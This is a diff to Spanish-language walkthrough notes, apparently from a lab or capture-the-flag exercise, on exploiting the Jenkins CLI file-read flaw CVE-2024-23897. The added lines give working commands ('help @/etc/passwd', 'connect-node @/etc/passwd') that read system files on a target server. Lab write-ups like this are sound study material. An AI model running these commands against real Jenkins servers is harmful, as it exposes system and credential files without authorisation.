@@ -113,10 +113,17 @@ git clone https://github.com/CKevens/CVE-2024-23897.git
 ```
 java -jar jenkins-cli.jar -s http://10.10.11.10:8080 who-am-i
 ```
-- Con este comando podemos enlistar mas información
+
+- Si queremos leer archivos de una ruta podemos utilizar 
 ```
-java -jar jenkins-cli.jar -s https://www.10.10.11.10:8080 connect-node @/etc/passwd
+java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help @/etc/passwd
 ```
+
+- Con este comando podemos enlistar mas información detallada
+```
+java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node @/etc/passwd
+```
+
 
 
 
